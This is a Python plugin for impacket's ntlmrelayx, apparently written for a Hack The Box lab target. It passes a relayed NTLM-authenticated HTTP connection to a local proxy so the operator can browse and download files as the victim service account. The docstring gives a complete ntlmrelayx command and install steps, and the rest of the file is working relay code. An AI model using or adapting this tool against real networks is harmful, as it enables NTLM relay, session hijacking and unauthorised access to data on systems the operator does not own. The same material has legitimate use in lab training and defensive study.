#!/usr/bin/env python3
"""Ghostlink relay bridge - custom ntlmrelayx HTTP attack.

Instead of the SOCKS plugin (which reads the raw socket and desyncs on
keep-alive reuse), this attack hands the authenticated HTTP connection to a
tiny local HTTP proxy. Every request to the proxy is serialized through the
relayed connection using http.client's proper request/getresponse cycle, so
we can browse / download files as the relayed service account without the
response-stream getting corrupted.

Place this file in impacket's ntlmrelayx/attacks/ directory so ntlmrelayx
auto-loads it, then run ntlmrelayx WITHOUT `-socks`:

    ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 \
        --no-smb-server --no-rdp-server --no-mssql-server --no-rpc-server \
        --keep-relaying

and point curl at http://127.0.0.1:18080/<path>.
"""
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.sccmpoliciesattack import SCCMPoliciesAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.sccmdpattack import SCCMDPAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"

BRIDGE_HOST = "127.0.0.1"
BRIDGE_PORT = 18080

# Namespaced globals (avoid clashing with impacket internals)
_gate = threading.Lock()
_live_conn = None      # most recent relayed HTTPConnection
_bridge_running = False


class HTTPAttack(ProtocolAttack, ADCSAttack, SCCMPoliciesAttack, SCCMDPAttack):
    PLUGIN_NAMES = ["HTTP", "HTTPS"]

    def run(self):
        if self.config.isADCSAttack:
            ADCSAttack._run(self)
            return
        if self.config.isSCCMPoliciesAttack:
            SCCMPoliciesAttack._run(self)
            return
        if self.config.isSCCMDPAttack:
            SCCMDPAttack._run(self)
            return

        global _live_conn, _bridge_running
        with _gate:
            _live_conn = self.client  # self.client is the HTTPConnection
            if not _bridge_running:
                _bridge_running = True
                threading.Thread(target=_run_bridge, daemon=True).start()
        LOG.info("[*] relay bridge: authenticated connection registered (proxy on %s:%d)",
                 BRIDGE_HOST, BRIDGE_PORT)


def _run_bridge():
    class _RelayHandler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def _forward(self):
            with _gate:
                conn = _live_conn
            if conn is None:
                self.send_error(502, "no relayed connection available yet")
                return

            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length) if length else None

            keep = {}
            for key, val in self.headers.items():
                low = key.lower()
                if low in ("host", "proxy-connection", "authorization",
                           "connection", "content-length", "accept-encoding"):
                    continue
                keep[key] = val

            try:
                with _gate:
                    conn.request(self.command, self.path, body=body, headers=keep)
                    resp = conn.getresponse()
                    data = resp.read()
                    status = resp.status
                    reason = resp.reason
                    hdrs = resp.getheaders()
            except Exception as exc:  # noqa: BLE001
                LOG.error("[!] bridge forward failed: %s", exc)
                self.send_error(502, str(exc))
                return

            self.send_response(status, reason)
            for key, val in hdrs:
                low = key.lower()
                if low in ("www-authenticate", "proxy-authenticate",
                           "transfer-encoding", "connection", "content-length"):
                    continue
                self.send_header(key, val)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            try:
                self.wfile.write(data)
            except Exception:  # noqa: BLE001
                pass

        do_GET = _forward
        do_POST = _forward
        do_PUT = _forward
        do_HEAD = _forward
        do_DELETE = _forward
        do_OPTIONS = _forward

    server = HTTPServer((BRIDGE_HOST, BRIDGE_PORT), _RelayHandler)
    LOG.info("[*] relay bridge listening on %s:%d", BRIDGE_HOST, BRIDGE_PORT)
    server.serve_forever()
